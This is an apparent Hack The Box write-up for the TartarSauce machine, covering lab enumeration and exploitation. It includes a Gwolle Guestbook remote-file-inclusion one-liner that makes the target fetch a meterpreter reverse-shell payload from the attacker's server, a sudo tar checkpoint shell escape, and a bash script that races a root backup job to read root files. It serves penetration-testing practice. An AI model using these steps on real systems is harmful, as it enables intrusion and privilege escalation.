# Target
| Category          | Details                                                                                                            |
|-------------------|--------------------------------------------------------------------------------------------------------------------|
| 📝 **Name**       | [TartarSauce](https://app.hackthebox.com/machines/TartarSauce)                                                     |  
| 🏷 **Type**       | HTB Machine                                                                                                        |
| 🖥 **OS**         | Linux                                                                                                              |
| 🎯 **Difficulty** | Medium                                                                                                             |
| 📁 **Tags**       | WordPress 4.9.4, Gwolle Guestbook 1.5.3, [CVE-2015-8351](https://nvd.nist.gov/vuln/detail/CVE-2015-8351), sudo tar |

### User flag

#### Scan target with `nmap`
```
┌──(magicrc㉿perun)-[~/attack/HTB TartarSauce]
└─$ nmap -sS -sC -sV -p- $TARGET
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-30 17:50 +0200
Nmap scan report for 10.129.1.185
Host is up (0.045s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Landing Page
| http-robots.txt: 5 disallowed entries 
| /webservices/tar/tar/source/ 
| /webservices/monstra-3.0.4/ /webservices/easy-file-uploader/ 
|_/webservices/developmental/ /webservices/phpmyadmin/

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.82 seconds
```

#### Access `robots.txt`
```
┌──(magicrc㉿perun)-[~/attack/HTB TartarSauce]
└─$ curl http://$TARGET/robots.txt             
User-agent: *
Disallow: /webservices/tar/tar/source/
Disallow: /webservices/monstra-3.0.4/
Disallow: /webservices/easy-file-uploader/
Disallow: /webservices/developmental/
Disallow: /webservices/phpmyadmin/
```
We could immediately spot Monster 3.0.4 running on target. This version has multiple vulnerabilities, we could even access its administrator panel using `admin:admin` credentials. However, further enumeration showed that this was a rabbit hole. 

#### Discover WordPress 4.9.4 instance running on server
```
┌──(magicrc㉿perun)-[~/attack/HTB TartarSauce]
└─$ feroxbuster --url http://$TARGET -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -x php,html,js,png,jpg,py,txt,log -C 404
<SNIP>
301      GET        0l        0w        0c http://10.129.1.185/webservices/wp/index.php => http://10.129.1.185/webservices/wp/
<SNIP>

┌──(magicrc㉿perun)-[~/attack/HTB TartarSauce]
└─$ curl -s http://$TARGET/webservices/wp/ | grep '<meta name="generator"'
<meta name="generator" content="WordPress 4.9.4" />
```

#### Enumerate WordPress plugins
```
┌──(magicrc㉿perun)-[~/attack/HTB TartarSauce]
└─$ feroxbuster --url http://$TARGET/webservices/wp/ -w /usr/share/seclists/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt -C 404
<SNIP>
200      GET        0l        0w        0c http://10.129.1.185/webservices/wp/wp-content/plugins/gwolle-gb/
<SNIP>
```

#### Discover Gwolle Guestbook 1.5.3 plugin installed
```
┌──(magicrc㉿perun)-[~/attack/HTB TartarSauce]
└─$ curl -s http://$TARGET/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt | grep -A10 "Changelog"
== Changelog ==

= 2.3.10 =
* 2018-2-12
* Changed version from 1.5.3 to 2.3.10 to trick wpscan ;D

= 1.5.3 =
* 2015-10-01
* When email is disabled, save it anyway when user is logged in.
* Add nb_NO (thanks Bjørn Inge Vårvik).
* Update ru_RU.
```
Changelog analysis suggests that version 1.5.3 is inplace. This version has a critical LFI / RFI [CVE-2015-8351](https://nvd.nist.gov/vuln/detail/CVE-2015-8351) vulnerability.

#### Start Metasploit and listen for reverse shell connection
```
┌──(magicrc㉿perun)-[~/attack/HTB TartarSauce]
└─$ msfconsole -q -x "use exploit/multi/handler; set LHOST tun0; set LPORT $LPORT; set payload php/meterpreter_reverse_tcp; run"
[*] Using configured payload generic/shell_reverse_tcp
LHOST => tun0
LPORT => 4444
payload => php/meterpreter_reverse_tcp
[*] Started reverse TCP handler on 10.10.16.193:4444
```

#### Exploit [CVE-2015-8351](https://nvd.nist.gov/vuln/detail/CVE-2015-8351) to spawn reverse shell
```
┌──(magicrc㉿perun)-[~/Documents/ctf-writeups]
└─$ msfvenom -p php/meterpreter_reverse_tcp LHOST=$LHOST LPORT=$LPORT -o wp-load.php && \
python3 -m http.server 80 > /dev/null 2>&1 & \
curl http://$TARGET/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://$LHOST/
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder specified, outputting raw payload
Payload size: 2650 bytes
Saved as: wp-load.php
[1] 2026898
```

#### Confirm foothold gained
```
[*] Meterpreter session 1 opened (10.10.16.193:4444 -> 10.129.1.185:50368) at 2026-04-01 07:09:47 +0200

meterpreter > getuid
Server username: www-data
```

#### List allowed `sudo` commands
```
www-data@TartarSauce:/$ sudo -l
sudo -l
Matching Defaults entries for www-data on TartarSauce:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on TartarSauce:
    (onuma) NOPASSWD: /bin/tar
```

#### Escalate to user `onuma` using `sudo /bin/tar`
```
www-data@TartarSauce:/$ sudo -u onuma /bin/tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh         
/bin/tar: Removing leading `/' from member names
$ id
uid=1000(onuma) gid=1000(onuma) groups=1000(onuma),24(cdrom),30(dip),46(plugdev)
```

#### Capture user flag
```
$ cat /home/onuma/user.txt
88a48bd8b7eba2fc3addf4b2073f433d
```

### Root flag

#### Discover `/usr/sbin/backuperer` being run as `root` every 5 min
Script invocation has been discovered with `pspy`.
```
<SNIP>
2026/04/01 01:21:11 CMD: UID=0     PID=3456   | /bin/bash /usr/sbin/backuperer 
<SNIP>
2026/04/01 01:21:12 CMD: UID=0     PID=3540   | /bin/bash /usr/sbin/backuperer 
<SNIP>
```

#### Analyze `/usr/sbin/backuperer`
```
$ cat -n /usr/sbin/backuperer
cat -n /usr/sbin/backuperer
<SNIP>
    10  # Set Vars Here
    11  basedir=/var/www/html
    12  bkpdir=/var/backups
    13  tmpdir=/var/tmp
    14  testmsg=$bkpdir/onuma_backup_test.txt
    15  errormsg=$bkpdir/onuma_backup_error.txt
    16  tmpfile=$tmpdir/.$(/usr/bin/head -c100 /dev/urandom |sha1sum|cut -d' ' -f1)
    17  check=$tmpdir/check
    18
    19  # formatting
    20  printbdr()
    21  {
    22      for n in $(seq 72);
    23      do /usr/bin/printf $"-";
    24      done
    25  }
    26  bdr=$(printbdr)
    27
    28  # Added a test file to let us see when the last backup was run
    29  /usr/bin/printf $"$bdr\nAuto backup backuperer backup last ran at : $(/bin/date)\n$bdr\n" > $testmsg
    30
    31  # Cleanup from last time.
    32  /bin/rm -rf $tmpdir/.* $check
    33
    34  # Backup onuma website dev files.
    35  /usr/bin/sudo -u onuma /bin/tar -zcvf $tmpfile $basedir &
    36
    37  # Added delay to wait for backup to complete if large files get added.
    38  /bin/sleep 30
    39
    40  # Test the backup integrity
    41  integrity_chk()
    42  {
    43      /usr/bin/diff -r $basedir $check$basedir
    44  }
    45
    46  /bin/mkdir $check
    47  /bin/tar -zxvf $tmpfile -C $check
    48  if [[ $(integrity_chk) ]]
    49  then
    50      # Report errors so the dev can investigate the issue.
    51      /usr/bin/printf $"$bdr\nIntegrity Check Error in backup last ran :  $(/bin/date)\n$bdr\n$tmpfile\n" >> $errormsg
    52      integrity_chk >> $errormsg
    53      exit 2
    54  else
    55      # Clean up and save archive to the bkpdir.
    56      /bin/mv $tmpfile $bkpdir/onuma-www-dev.bak
    57      /bin/rm -rf $check .*
    58      exit 0
    59  fi
```
We could see that `/var/www/html` is tared, as `onuma` user (line 35), to randomly named archive. Then after 30 seconds (line 38), its being untared to `/var/tmp/check` and its integrity is being checked using `/usr/bin/diff -r`. If there was a difference between original and archived `/var/www/html` it will be logged to `/var/backups/onuma_backup_error.txt` file.

Due to 30 seconds of we have ability to extract `$tmpfile`, replace one of the files with symbolic link to file we would like to read, and re-archive it using same `$tmpfile` filename. `integrity_chk` function will follow our symbolic link, detect and log difference between files, and thus effectively putting content of given file into `/var/backups/onuma_backup_error.txt`.

#### Prepare `lfi.sh` exploit
```
$ { cat <<'EOF'> /tmp/lfi.sh
#!/bin/bash

TMPDIR="/var/tmp"

echo "[*] Watching for backup archive..."
while true; do
    for f in "$TMPDIR"/.*; do
        [[ "$f" == "$TMPDIR/." || "$f" == "$TMPDIR/.." ]] && continue

        if [[ -f "$f" ]]; then
            echo "[+] Found archive: $f"
            sleep 5
            WORKDIR=$(mktemp -d)
            tar -xzf "$f" -C "$WORKDIR" 2>/dev/null
            if [[ -d "$WORKDIR/var/www/html" ]]; then
                echo "[+] Found webroot inside archive"
                rm -f "$WORKDIR/var/www/html/robots.txt"
                echo "[+] Injecting symlink to [$1]"
                ln -s $1 "$WORKDIR/var/www/html/robots.txt"
                tar -czf "$WORKDIR/new.tar.gz" --ignore-failed-read -C "$WORKDIR" var 2>/dev/null
                cp "$WORKDIR/new.tar.gz" "$f" 2>/dev/null
                echo "[+] Archive replaced"
            fi
            exit 1
        fi
    done
done
EOF
} && chmod +x /tmp/lfi.sh
```

#### Run `lfi.sh` to read `/root/root.txt`
```
$ /tmp/lfi.sh /root/root.txt
/tmp/lfi.sh /root/root.txt
[*] Watching for backup archive...
[+] Found archive: /var/tmp/.0c0ce233791289a3bd1041e59a8334621130f6f5
[+] Found webroot inside archive
[+] Injecting symlink to [/root/root.txt]
[+] Archive replaced
```

#### Read root flag from `/var/backups/onuma_backup_error.txt`
```
$ cat /var/backups/onuma_backup_error.txt
<SNIP>
------------------------------------------------------------------------
Integrity Check Error in backup last ran :  Wed Apr  1 02:52:07 EDT 2026
------------------------------------------------------------------------
/var/tmp/.0c0ce233791289a3bd1041e59a8334621130f6f5
diff -r /var/www/html/robots.txt /var/tmp/check/var/www/html/robots.txt
1,7c1
< User-agent: *
< Disallow: /webservices/tar/tar/source/
< Disallow: /webservices/monstra-3.0.4/
< Disallow: /webservices/easy-file-uploader/
< Disallow: /webservices/developmental/
< Disallow: /webservices/phpmyadmin/
< 
---
> 1c4dec9f639f16e756962f88cf66a89e
Only in /var/www/html/webservices/monstra-3.0.4/public/uploads: .empty
```
